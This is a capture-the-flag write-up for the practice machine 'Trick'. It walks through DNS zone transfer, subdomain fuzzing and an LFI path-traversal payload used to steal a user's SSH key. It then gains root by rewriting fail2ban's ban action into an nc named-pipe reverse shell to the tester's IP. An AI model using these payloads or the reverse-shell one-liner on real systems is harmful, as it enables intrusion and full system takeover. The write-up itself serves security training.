# TRICK

### User flag

First the usual nmap scan which found 4 open ports

```shell
[dasor@archlinux]$ nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oN allports 10.10.11.166
 PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
25/tcp open  smtp    syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
...
[dasor@archlinux]$ nmap -sCV -p22,80,53,25 -oN targeted 10.10.11.143
PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
25/tcp closed smtp
53/tcp closed domain
80/tcp open   http    Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
```

At first I inspected the webpage but did not found anything interesting and continued enumerating smtp. (I also added the machine as trick.htb in my etc/hosts as usual)

```shell
[dasor@archlinux]$ nmap -p25 --script smtp-commands -oN smtp 10.10.11.166
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
CHUNKING
...
[dasor@archlinux]$ nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} -oN smtpusers trick.htb
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users:
|_  Couldn't find any accounts
...
[dasor@archlinux]$ nmap -p25 --script smtp-open-relay 10.10.11.166
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed
```

Another rabbit hole I guess. Next I started enumerating port 53 dns as my last resource. I used dig and at first I did not find anything important until I tried with zone transfer

```shell
[dasor@archlinux]$ dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.4 <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800

```

Interesting, two subdomains to add to the etc/host. The root one is useless since it is the same page. On the other hand the preprod-payroll has a login page. I tried a lot of sql injections, LFI and fuzzed the site but nothing came up. At this point I thought to fuzz some more subdirectories in the lines of preprod-xxxx.

```shell
[dasor@archlinux]$ ffuf -w /mnt/home/dasor/wordlist/directory-list-2.3-big.txt:FUZZ -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -v -fs 5480

[Status: 200, Size: 9660, Words: 3007, Lines: 179]
| URL | http://trick.htb/
    * FUZZ: marketing

```

after again adding the domain to the /etc/hosts file I found a pretty "interesting" webpage. When you click in any section the url changes to index.php**?page=about.html** or to whatever section you selected. This seemed as a possible LFI, first I tried with the usual ../../../../etc/passwd but it gave me a blank page. Then I decided to fuzz for LFI.

```shell
[dasor@archlinux]$ ffuf -w /mnt/home/dasor/wordlist/LFI-Jhaddix.txt:FUZZ -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -v -fs 0

[Status: 200, Size: 2351, Words: 28, Lines: 42]
| URL | http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

```

Once I knew this I read the passwd file and found a user called michael so I tried to read his .ssh directory, and it worked! I copied his id_rsa to my machine and got the user flag

### Root Flag

Before continuing I would like to point out this was the easiest root flag ever. Once in the machine I execute the usual sudo -l to see if I had some privilege and got This

```shell
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

fail2ban is an app I have heard a lot about and what it does is just ban your IP if you fail many times trying to login to ssh (as the name points out). I just searched on google fail2ban privilege escalation and found lots of articles. Basicly if you can edit the file at /etc/fail2ban/action.d/iptables-multiport.conf you can chnage the command that gets executed **by root** when he bans someone.

```shell
michael@trick:/etc/fail2ban/action.d$ ls -la
total 288
drwxrwx--- 2 root security  4096 Jul 14 17:36 .
drwxr-xr-x 6 root root      4096 Jul 14 17:36 ..
-rw-r--r-- 1 root root      1420 Jul 14 17:36 iptables-multiport.conf
```

Even thought the file owner is root and we cannot edit it, we can replace the file because the user michael is in the security group (you can check it using the command groups) and has all to privileges in the folder.

```shell
michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf .
michael@trick:~$ vim iptables-multiport.conf
... (we change the action ban command to a reverse shell)
actionban =  rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.83 4242 >/tmp/f
...
michael@trick:~$ mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
mv: replace '/etc/fail2ban/action.d/iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? y
michael@trick:~$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

once that is done we ban ourselves by login incorrectly to ssh a lot of times and we will get root. However you have to be quick since the config file changes to the default one after some time.

```shell
[dasor@archlinux ~]$ nc -lvp 4242
Connection from 10.10.11.166:49380
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
```
